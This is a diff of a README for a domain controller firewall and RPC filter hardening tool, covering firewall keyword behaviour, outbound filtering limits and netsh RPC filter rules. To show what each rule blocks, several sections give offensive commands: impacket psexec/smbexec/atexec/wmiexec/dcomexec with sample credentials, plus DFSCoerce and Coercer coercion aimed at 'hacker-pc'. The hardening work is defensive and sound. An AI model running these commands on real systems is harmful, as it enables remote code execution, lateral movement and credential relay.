@@ -94,6 +94,15 @@ This tool provides a flexible and repeatable way to deploy a secure configuratio
 - The configuration does not differentiate between the Domain, Private, and Public firewall profiles to avoid potential DC unavailability in case of incorrect network type detection by NLA.
 - Many services that typically use dynamic ports are configured with **static port numbers** by the tool. This allows for easier tracing and troubleshooting at the network level and simplifies rule configuration for network firewalls.
 
+### Firewall Rule Merging
+
+TODO: Picture of OU/GPO hierarchy from GPMC.
+
+### Identifying Management Traffic
+
+Easy: RDP, WinRM (PowerShell Remoting), ADWS,...
+Problems: MS-DRSR, LDAP, SMB, DCOM, Remote Registry
+
 ### Firewall Rule Deduplication
 
 Many of the built-in/predefined Windows Firewall rules are actually duplicates of each other, as they open the same ports, even though their names might suggest otherwise. For example, all of the following rules open port `TCP/135` for the `rpcss` service:
@@ -130,30 +139,45 @@ Similarly, all of these firewall rules open port `TCP/445` for `System`:
 
 ![Duplicate SMB rules](../Screenshots/duplicate-epmap-rules.png)
 
-Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly. To keep configuration readable, it is reasonable to consolidate the redundant rules, and to create a single firewall rule for each static port number.
+Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly. To keep the configuration readable, it is reasonable to consolidate the redundant rules, and to create a single firewall rule for each static port number.
 
 ### Issues with Predefined Address Sets
 
-Configuration of remote or local IP address in a rule contains predefined sets of computers, also reffered as keywords.
+#### Overview of Keywords
 
-![Predefined address sets in Windows Firwall](../Screenshots/firewall-predefined-sets.png)
+In addition to manually enumerating IP address ranges, the firewall rule scope configuration allows the use of predefined sets of computers, known as keywords:
 
-There's no Microsoft documentation explaining how the keywords are defined, the only documentation briefly mentioning the keywords is [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f)
+![Predefined address sets in Windows Firewall](../Screenshots/firewall-predefined-sets.png)
 
-- Internet
-  - presumably anything not defined as Intranet keyword.
-  - based on unpredictability of the Intranet keyword application and definition, we haven't used the Internet keyword in any rules.
-- Intranet
-  - this keyword source for "Intranet" IP ranges is subnets definition in Sites and Services, all subnets defined there are considered "Intranet" for the sake of firewall rules.
-  - repeatedly during testing, firewall "Intranet" keyword definition haven't been updated after new subnet has been added or subnet has been deleted, not even after multiple server restarts.
-  - this unreliability is the reason why we haven't used it in the definitions.
+These keywords are briefly described in the [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f) document. However, there is no public documentation available that explains how the keywords are defined and under what circumstances the corresponding IP addresses are updated.
 
-    ![Subnets - source for Intranet keyword](../Screenshots/firewall-keyword-Intranet.png)
+#### Intranet
 
-- DNS Servers
-  - this keyword is functional and respects all DNS servers defined in the properties of a network adapter. If new DNS server is defined it will be honored by the keyword only after change of network adapter state (disable / enable, server restart, etc.)
+The *Intranet* keyword is based on the Subnet definition from Active Directory Sites and Services. However, our tests have shown that the corresponding firewall rule scopes are not re-evaluated after adding or deleting a subnet. Even multiple server reboots do not seem to resolve this issue. Due to this unreliability, we have decided not to use the *Intranet* keyword in any firewall rules.
 
-    ![Network adapter DNS configuration](../Screenshots/firewall-keyword-DNS.png)
+![Subnets - The source for the Intranet keyword](../Screenshots/firewall-keyword-Intranet.png)
+
+#### Internet
+
+The *Internet* keyword is presumed to include anything not defined as the *Intranet* keyword. However, due to the unpredictable and undocumented behavior of the *Intranet* keyword, we have decided not to use the *Internet* keyword in any firewall rules as well.
+
+#### DNS Servers
+
+The *DNS Servers* keyword is functional and respects all DNS servers defined in the network adapter properties. If a new DNS server IP address is configured, a network adapter state change (disable/enable, server restart, etc.) is required for the corresponding firewall rules to be automatically updated.
+
+![Network adapter DNS configuration](../Screenshots/firewall-keyword-DNS.png)
+
+#### Additional Keywords
+
+Additional keywords are available and although they seem to be mostly working, they are not relevant to inbound firewall rule configuration for Domain Controller:
+
+- Local subnet
+- DHCP servers
+- WINS servers
+- Default gateway
+- Remote Corp Network
+- PlayTo Renderers
+- Captive Portal Addresses
 
 ### Avoiding Localized Rule Names
 
@@ -173,6 +197,8 @@ Some firewall-related settings are not removed from the domain controllers after
 
 As a consequence, before the value of an unmanaged setting can be changed from `true` to `null`, it must temporarily be set to `false`.  Keep in mind that it may take time for the new settings to propagate to all domain controllers due to replication latency. Additionally, some settings may require a reboot.
 
+TODO: List settings that do tattooing.
+
 ### System Reboots
 
 Changes to some settings require a reboot of the target domain controller to get applied. This is the case of static port number configurations and settings that are modified through the startup script:
@@ -190,17 +216,8 @@ If a full system reboot of all domain controllers is undesirable, the following 
 1. Make sure that the Group Policy changes are replicated to all domain controllers.
 2. Invoke the `gpupdate.exe` command for the changed policies to be applied immediately.
 3. Run the `gpscript.exe /startup` command for Group Policy startup scripts to be executed immediately.
-4. Execute the `net stop ntds && net start ntds` command to restart the AD DS Domain Controller service.
+4. Execute the `net.exe stop ntds && net.exe start ntds` command to restart the AD DS Domain Controller service.
 5. Repeat steps 2-4 on all domain controllers.
-
-### Firewall Rule Merging
-
-TODO: Picture of OU/GPO hierarchy from GPMC.
-
-### Identifying Management Traffic
-
-Easy: RDP, WinRM (PowerShell Remoting), ADWS,...
-Problems: MS-DRSR, LDAP, SMB, DCOM, Remote Registry
 
 ### Security Standards Compliance
 
@@ -208,18 +225,326 @@ Problems: MS-DRSR, LDAP, SMB, DCOM, Remote Registry
 - [CIS: Microsoft Windows Server 2022 v2.0.0 L1 DC](https://www.tenable.com/audits/CIS_Microsoft_Windows_Server_2022_Benchmark_v2.0.0_L1_DC)
 - [Microsoft: Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
 
+### Infeasibility of Outbound Traffic Filtering
+
+#### Reasons for Blocking Outbound Traffic
+
+NTLM relay to workstations, lateral movement, C2 channel to the Internet
+
+#### Services with User Impersonation
+
+- Windows Update (wuauserv)
+- Cryptographic Services (CryptSvc)
+- Microsoft Account Sign-in Assistant (wlidsvc)
+- Background Intelligent Transfer Service (BITS)
+
+#### Dynamic Keywords
+
+https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords
+
+#### Scheduled Tasks with Custom Handlers
+
+taskhostw.exe
+
+![Scheduled task with a custom handler](../Screenshots/scheduled-task-custom-handler.png)
+
+#### Microsoft Defender for Identity
+
+Defender for Identity sensor to All devices on network  - SMB (TCP/UDP 445), RPC (TCP 135), NetBIOS (UDP 137), RDP (TCP 3389).
+
+#### Azure Arc
+
+PowerShell, msiexec
+
+![Azure Arc binaries](../Screenshots/azure-arc-binaries.png)
+
+Any process
+
+![Azure Arc built-in firewall rule](../Screenshots/azure-arc-firewall.png)
+
+#### Installers Downloading Additional Files
+
+#### WinHTTP Proxy
+
+![Listing the advanced WinHTTP proxy configuration](../Screenshots/proxy-config.png)
+
+![WinHTTP proxy configuration error](../Screenshots/proxy-error.png)
+
+### Static RPC Ports
+
+TODO
+
+- [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port)
+- [Configuring DFSR to a Static Port - The rest of the story](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/configuring-dfsr-to-a-static-port-the-rest-of-the-story/ba-p/396746)
+- [Setting Up a Fixed Port for WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/setting-up-a-fixed-port-for-wmi)
+
+### RPC Filters
+
+#### RPC over Named Pipes
+
+TODO
+
+#### \[MS-SCMR\]: Service Control Manager Remote Protocol
+
+```shell
+sc.exe \\contoso-dc query wuauserv
+```
+
+```shell
+impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+```shell
+impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+Named pipe: [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) , Protocol UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)
+
+```txt
+# Block [MS-SCMR]: Service Control Manager Remote Protocol
+# Named pipe: \PIPE\svcctl
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=d0c7640c-9355-4e52-8335-c12835559c10
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=367ABB81-9844-35F1-AD32-98F038001003
+add filter
+```
+
+#### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol
+
+```shell
+schtasks.exe /query /s contoso-dc
+```
+
+```shell
+impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+Named pipe: [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+Interface UUID: [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol
+# Named pipe: \PIPE\atsvc
+# Interface: Windows Vista Task Remote Protocol (ITaskSchedulerService)
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=a43b9dd2-0866-4476-89dc-2e9b200762af
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=86D35949-83C9-4044-B424-DB363231FD0C
+add filter
+```
+
+Interface UUID: [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol
+# Named pipe: \PIPE\atsvc
+# Interface: Task Scheduler Agent (ATSvc)
+add rule layer=um actiontype=block filterkey=13518c11-e3d8-4f62-9461-eda11beb540a
+add condition field=if_uuid matchtype=equal data=1FF70682-0A51-30E8-076D-740BE8CEE98B
+add filter
+```
+
+Interface UUID: [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol
+# Named pipe: \PIPE\atsvc
+# Interface: Net Schedule (SASec)
+add rule layer=um actiontype=block filterkey=1c079a18-e91f-4698-9868-68a121490636
+add condition field=if_uuid matchtype=equal data=378E52B0-C0A9-11CF-822D-00AA0051E40F
+add filter
+```
+
+#### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0
+
+```shell
+wevtutil.exe /r:contoso-dc qe System /c:1
+```
+
+Ability to clear security event logs remotely.
+
+```txt
+# Block [MS-EVEN6]: EventLog Remoting Protocol Version 6.0
+# Named pipe: \PIPE\eventlog
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=dedffabf-db89-4177-be77-1954aa2c0b95
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+add filter
+```
+
+#### \[MS-EVEN\]: EventLog Remoting Protocol
+
+TODO
+
+Legacy proto, Uses only named pipes
+
+```txt
+# Block [MS-EVEN]: EventLog Remoting Protocol
+# Named pipe: \PIPE\eventlog
+add rule layer=um actiontype=block filterkey=f7f68868-5f50-4cda-a18c-6a7a549652e7
+add condition field=if_uuid matchtype=equal data=82273FDC-E32A-18C3-3F78-827929DC23EA
+add filter
+```
+
+#### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
+
+Restrict to Domain Admins
+
+```shell
+python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
+```
+
+```txt
+# Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol
+# Named pipe: \PIPE\netdfs
+# Limit access to Domain Admins only.
+add rule layer=um actiontype=permit filterkey=43873c58-e130-4ffb-8858-d259a673a917
+add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
+add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
+add filter
+
+# Block MS-DFSNM by default
+add rule layer=um actiontype=block filterkey=0a239867-73db-45e6-b287-d006fe3c8b18
+add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
+add filter
+```
+
+#### \[MS-RPRN\]: Print System Remote Protocol
+
+https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print
+
+TODO
+
+```txt
+# Block [MS-RPRN]: Print System Remote Protocol
+# Named pipe: \PIPE\spoolss
+# This rule only blocks RPC over Named Pipes,
+# while RPC over TCP is still allowed on Windows 11, version 22H2
+# and later versions of Windows.
+add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
+add filter
+```
+
+#### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
+
+```shell
+coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
+```
+
+```txt
+# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol
+# Named pipe: \PIPE\lsarpc
+# Require Kerberos authentication and packet encryption.
+# Not bulletproof, but blocks most hacktools.
+add rule layer=um actiontype=permit filterkey=d71d00db-3eef-4935-bedf-20cf628abd9e
+add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
+add condition field=auth_type matchtype=equal data=16
+add condition field=auth_level matchtype=equal data=6
+add filter
+
+# Block MS-EFSR over \PIPE\lsarpc by default
+add rule layer=um actiontype=block filterkey=3a4cce27-a7fa-4248-b8b8-ef6439a2c0ff
+add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
+add filter
+
+# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol
+# Named pipe: \PIPE\efsrpc
+# Require Kerberos authentication and packet encryption.
+# Not bulletproof, but blocks most hacktools.
+add rule layer=um actiontype=permit filterkey=c5cf8020-c83c-4803-9241-8c7f3b10171f
+add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
+add condition field=auth_type matchtype=equal data=16
+add condition field=auth_level matchtype=equal data=6
+add filter
+
+# Block MS-EFSR over \PIPE\efsrpc by default
+add rule layer=um actiontype=block filterkey=9ad23a91-085d-4f99-ae15-85e0ad801278
+add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
+add filter
+```
+
+#### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
+
+TODO
+
+```txt
+# Block [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol, Named pipe: \PIPE\DNSSERVER
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=50754fe4-aa2d-42ff-8196-e90ea8fd2527
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=50abc2a4-574d-40b3-9d66-ee4fd5fba076
+add filter
+```
+
+#### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol
+
+```powershell
+Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
+```
+
+```shell
+impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+Solved using Defender ASR rules.
+
+TODO: Test service creation using WMI
+
+#### DCOM
+
+TODO: Block command execution over DCOM over named pipes (ShellWindows, ShellBrowserWindow, and MMC20 objects)
+
+```shell
+impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+TODO: Does it event work?
+
+#### \[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd
+
+TODO: Block RDP-related protocols over named pipes?
+
+#### \[MS-RSP\]: Remote Shutdown Protocol
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074
+
+UUID: d95afe70-a6d5-4259-822e-2c84da1ddb0d
+ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
+
+UUID: 76f226c3-ec14-4325-8a99-6a46348418af
+ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
+
+#### Further Protocol Considerations
+
+TODO: Firewall remote management?
+
+#### Additional Reading on RPC
+
+- [MSRPC-To-ATT&CK](https://github.com/jsecurity101/MSRPC-to-ATTACK)
+- [A Definitive Guide to the Remote Procedure Call (RPC) Filter](https://www.akamai.com/blog/security/guide-rpc-filter#using)
+- [server22_rpc_servers_scrape.csv](https://github.com/akamai/akamai-security-research/blob/main/rpc_toolkit/rpc_interface_lists/server22_rpc_servers_scrape.csv)
+
 ### Distribution Contents
 
 TODO: File list
 
 ## Prerequisites
 
-- Domain administrator role or adequate role, allowing for creation of a GPO, creation of folders and files in SYSVOL and linking the GPO to Domain Controllers OU.
-- PowerShell version 5.1 ![](https://img.shields.io/badge/PowerShell-5+-0000FF.png?logo=PowerShell)
-- PowerShell modules (RSAT)
+![](https://img.shields.io/badge/Windows%20Server-2016%20|%202019%20|%202022%20|%202025-007bb8.png?logo=Windows%2011) ![](https://img.shields.io/badge/Windows-10%20|%2011-7bb800.png?logo=windows)
+
+![](https://img.shields.io/badge/PowerShell-5+-0000FF.png?logo=PowerShell)
+
+- Domain Admins group membership or equivalent privileges, enabling the creation of a Group Policy Object (GPO), creation of folders and files in SYSVOL, and linking the GPO to the Domain Controllers OU.
+- PowerShell modules that must be installed as part of RSAT:
   - [GroupPolicy](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps)
   - [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
-- Supported OS: ![](https://img.shields.io/badge/Windows%20Server-2016%20|%202019%20|%202022%20|%202025-007bb8.png?logo=Windows%2011)  ![](https://img.shields.io/badge/Windows-10%7C11-7bb800?logo=windows)
 
 ## Group Policy Object Contents
 
@@ -285,7 +610,9 @@ winmgmt.exe /standalonehost 6
 If the server doesn't have DFS Management tools installed, the script will istall it.
 
 ```bat
-if not exist "%SystemRoot%\system32\dfsrdiag.exe" (dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt)
+if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
+  dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
+)
 ```
 
 Next, it will configure the DFSR to use static port.
@@ -1077,296 +1404,6 @@ netsh rpc filter delete filter filterkey=all
 > [!IMPORTANT]
 > TODO: GPO tattoing
 
-## Infeasibility of Outbound Traffic Filtering
-
-### Reasons for Blocking Outbound Traffic
-
-NTLM relay to workstations, lateral movement, C2 channel to the Internet
-
-### Services with User Impersonation
-
-- Windows Update (wuauserv)
-- Cryptographic Services (CryptSvc)
-- Microsoft Account Sign-in Assistant (wlidsvc)
-- Background Intelligent Transfer Service (BITS)
-
-### Dynamic Keywords
-
-https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords
-
-### Scheduled Tasks with Custom Handlers
-
-taskhostw.exe
-
-![Scheduled task with a custom handler](../Screenshots/scheduled-task-custom-handler.png)
-
-### Microsoft Defender for Identity
-
-Defender for Identity sensor to All devices on network  - SMB (TCP/UDP 445), RPC (TCP 135), NetBIOS (UDP 137), RDP (TCP 3389).
-
-### Azure Arc
-
-PowerShell, msiexec
-
-![Azure Arc binaries](../Screenshots/azure-arc-binaries.png)
-
-Any process
-
-![Azure Arc built-in firewall rule](../Screenshots/azure-arc-firewall.png)
-
-### Installers Downloading Additional Files
-
-### WinHTTP Proxy
-
-![Listing the advanced WinHTTP proxy configuration](../Screenshots/proxy-config.png)
-
-![WinHTTP proxy configuration error](../Screenshots/proxy-error.png)
-
-## Static RPC Ports
-
-TODO
-
-- [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port)
-- [Configuring DFSR to a Static Port - The rest of the story](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/configuring-dfsr-to-a-static-port-the-rest-of-the-story/ba-p/396746)
-- [Setting Up a Fixed Port for WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/setting-up-a-fixed-port-for-wmi)
-
-## RPC Filters
-
-### RPC over Named Pipes
-
-TODO
-
-### \[MS-SCMR\]: Service Control Manager Remote Protocol
-
-```shell
-sc.exe \\contoso-dc query wuauserv
-```
-
-```shell
-impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
-
-```shell
-impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
-
-Named pipe: [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) , Protocol UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)
-
-```txt
-# Block [MS-SCMR]: Service Control Manager Remote Protocol, Named pipe: \PIPE\svcctl
-# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
-add rule layer=um actiontype=block filterkey=d0c7640c-9355-4e52-8335-c12835559c10
-add condition field=protocol matchtype=equal data=ncacn_np
-add condition field=if_uuid matchtype=equal data=367ABB81-9844-35F1-AD32-98F038001003
-add filter
-```
-
-### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol
-
-```shell
-schtasks.exe /query /s contoso-dc
-```
-
-```shell
-impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
-
-Named pipe: [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
-
-Interface UUID: [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
-
-```txt
-# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Windows Vista Task Remote Protocol (ITaskSchedulerService)
-# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
-add rule layer=um actiontype=block filterkey=a43b9dd2-0866-4476-89dc-2e9b200762af
-add condition field=protocol matchtype=equal data=ncacn_np
-add condition field=if_uuid matchtype=equal data=86D35949-83C9-4044-B424-DB363231FD0C
-add filter
-```
-
-Interface UUID: [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
-
-```txt
-# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Task Scheduler Agent (ATSvc)
-add rule layer=um actiontype=block filterkey=13518c11-e3d8-4f62-9461-eda11beb540a
-add condition field=if_uuid matchtype=equal data=1FF70682-0A51-30E8-076D-740BE8CEE98B
-add filter
-```
-
-Interface UUID: [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
-
-```txt
-# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Net Schedule (SASec)
-add rule layer=um actiontype=block filterkey=1c079a18-e91f-4698-9868-68a121490636
-add condition field=if_uuid matchtype=equal data=378E52B0-C0A9-11CF-822D-00AA0051E40F
-add filter
-```
-
-### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0
-
-```shell
-wevtutil.exe /r:contoso-dc qe System /c:1
-```
-
-Ability to clear security event logs remotely.
-
-```txt
-# Block [MS-EVEN6]: EventLog Remoting Protocol Version 6.0, Named pipe: \PIPE\eventlog
-# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
-add rule layer=um actiontype=block filterkey=dedffabf-db89-4177-be77-1954aa2c0b95
-add condition field=protocol matchtype=equal data=ncacn_np
-add condition field=if_uuid matchtype=equal data=f6beaff7-1e19-4fbb-9f8f-b89e2018337c
-add filter
-```
-
-### \[MS-EVEN\]: EventLog Remoting Protocol
-
-TODO
-
-Legacy proto, Uses only named pipes
-
-```txt
-# Block [MS-EVEN]: EventLog Remoting Protocol, Named pipe: \PIPE\eventlog
-add rule layer=um actiontype=block filterkey=f7f68868-5f50-4cda-a18c-6a7a549652e7
-add condition field=if_uuid matchtype=equal data=82273FDC-E32A-18C3-3F78-827929DC23EA
-add filter
-```
-
-### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
-
-Restrict to Domain Admins
-
-```shell
-python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
-```
-
-```txt
-# Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol, Named pipe: \PIPE\netdfs
-# Limit access to Domain Admins only.
-add rule layer=um actiontype=permit filterkey=43873c58-e130-4ffb-8858-d259a673a917
-add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
-add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
-add filter
-
-# Block MS-DFSNM by default
-add rule layer=um actiontype=block filterkey=0a239867-73db-45e6-b287-d006fe3c8b18
-add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
-add filter
-```
-
-### \[MS-RPRN\]: Print System Remote Protocol
-
-https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print
-
-TODO
-
-```txt
-# Block [MS-RPRN]: Print System Remote Protocol, Named pipe: \PIPE\spoolss
-# This rule only blocks RPC over Named Pipes,
-# while RPC over TCP is still allowed on Windows 11, version 22H2 and later versions of Windows.
-add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
-add condition field=protocol matchtype=equal data=ncacn_np
-add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
-add filter
-```
-
-### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
-
-```shell
-coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
-```
-
-```txt
-# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\lsarpc
-# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
-add rule layer=um actiontype=permit filterkey=d71d00db-3eef-4935-bedf-20cf628abd9e
-add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
-add condition field=auth_type matchtype=equal data=16
-add condition field=auth_level matchtype=equal data=6
-add filter
-
-# Block MS-EFSR over \PIPE\lsarpc by default
-add rule layer=um actiontype=block filterkey=3a4cce27-a7fa-4248-b8b8-ef6439a2c0ff
-add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
-add filter
-
-# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\efsrpc
-# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
-add rule layer=um actiontype=permit filterkey=c5cf8020-c83c-4803-9241-8c7f3b10171f
-add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
-add condition field=auth_type matchtype=equal data=16
-add condition field=auth_level matchtype=equal data=6
-add filter
-
-# Block MS-EFSR over \PIPE\efsrpc by default
-add rule layer=um actiontype=block filterkey=9ad23a91-085d-4f99-ae15-85e0ad801278
-add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
-add filter
-```
-
-### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
-
-TODO
-
-```txt
-# Block [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol, Named pipe: \PIPE\DNSSERVER
-# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
-add rule layer=um actiontype=block filterkey=50754fe4-aa2d-42ff-8196-e90ea8fd2527
-add condition field=protocol matchtype=equal data=ncacn_np
-add condition field=if_uuid matchtype=equal data=50abc2a4-574d-40b3-9d66-ee4fd5fba076
-add filter
-```
-
-### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol
-
-```powershell
-Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
-```
-
-```shell
-impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
-
-Solved using Defender ASR rules.
-
-TODO: Test service creation using WMI
-
-### DCOM
-
-TODO: Block command execution over DCOM over named pipes (ShellWindows, ShellBrowserWindow, and MMC20 objects)
-
-```shell
-impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
-
-TODO: Does it event work?
-
-### \[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol
-
